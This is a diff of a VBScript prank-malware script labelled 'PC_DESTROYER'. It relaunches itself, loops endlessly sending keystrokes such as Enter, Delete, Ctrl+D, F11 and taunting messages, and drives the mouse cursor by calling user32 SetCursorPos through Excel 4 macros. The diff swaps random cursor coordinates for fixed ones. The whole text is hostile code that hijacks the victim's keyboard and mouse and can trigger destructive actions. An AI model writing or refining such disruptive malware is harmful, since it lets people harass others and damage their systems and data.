@@ -2,13 +2,8 @@
  CreateObject("WScript.Shell").Run WScript.ScriptFullName
  auto.sendkeys "UR PC IS FUCKED BY PC_DESTROYER"
  do
-    Dim max,min,rand
-    max=1000
-    min=0
-    Randomize
-    rand = Int((max-min+1)*Rnd+min)
     Dim Excel: Set Excel = WScript.CreateObject("Excel.Application") 
-    Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""{max}"",""{max}"")"
+    Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""500"",""500"")"
     auto.sendkeys "{enter}"
     auto.sendkeys "^%l"
     auto.sendkeys "{F11}"
@@ -18,6 +13,8 @@
     auto.sendkeys "^%l"
     auto.sendkeys "rizz grimice ohio"
     auto.sendkeys "VIRUS AHHAHAHAH"
+ Dim Excel: Set Excel = WScript.CreateObject("Excel.Application") 
+    Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""200"",""200"")"
     auto.sendkeys "dsgsdfs"
     auto.sendkeys "{UP}"
         auto.sendkeys "{enter}"
@@ -29,6 +26,8 @@
     auto.sendkeys "abcqertyuiofvbnh"
     auto.sendkeys "{del}"
     auto.sendkeys  "^d"
+ Dim Excel: Set Excel = WScript.CreateObject("Excel.Application") 
+    Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""0"",""0"")"
     auto.sendkeys "{F12}"
     auto.sendkeys "{LEFT}"
 auto.sendkeys "{DOWN}"
@@ -37,6 +36,8 @@ auto.sendkeys "{DOWN}"
     auto.sendkeys "{F8}"
     auto.sendkeys "{F9}"
     auto.sendkeys "{del}"
+ Dim Excel: Set Excel = WScript.CreateObject("Excel.Application") 
+    Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""800"",""800"")"
         auto.sendkeys "{enter}"
     auto.sendkeys "{LEFT}"
 auto.sendkeys "{DOWN}"
